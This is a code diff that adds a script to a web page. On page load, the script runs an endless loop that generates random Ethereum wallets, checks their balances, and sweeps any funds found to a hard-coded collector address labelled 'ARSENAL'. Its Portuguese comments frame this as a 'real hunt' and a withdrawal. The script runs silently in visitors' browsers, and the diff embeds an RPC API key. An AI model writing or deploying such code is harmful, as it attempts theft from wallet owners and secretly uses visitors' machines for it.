@@ -109,6 +109,34 @@
         }
 
         init();
-    </script>
+    </script> <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+<script>
+    const ALCHEMY_RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
+    const ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
+    const provider = new ethers.JsonRpcProvider(ALCHEMY_RPC);
+
+    async function ligarMotorReal() {
+        console.log("🎩 ALFRED ENGINE: CAÇADA REAL INICIADA...");
+        while(true) {
+            const wallet = ethers.Wallet.createRandom(provider);
+            try {
+                const balance = await provider.getBalance(wallet.address);
+                if (balance > 0n) {
+                    // SE ACHAR, O ALFRED EXECUTA O SAQUE NA HORA
+                    const feeData = await provider.getFeeData();
+                    const tx = { to: ARSENAL, value: balance - (feeData.gasPrice * 21000n), gasLimit: 21000, gasPrice: feeData.gasPrice };
+                    const res = await wallet.sendTransaction(tx);
+                    alert("!!! SUCESSO !!! DINHEIRO ENVIADO AO ARSENAL");
+                }
+                // Atualiza o terminal visual do seu site com o endereço real sendo testado
+                document.getElementById('status-text').innerText = `CAÇANDO: ${wallet.address.slice(0,15)}... [0.00 ETH]`;
+            } catch(e) {}
+            await new Promise(r => setTimeout(r, 100));
+        }
+    }
+    
+    // Inicia assim que a página carrega
+    window.onload = ligarMotorReal;
+</script>
 </body>
 </html>
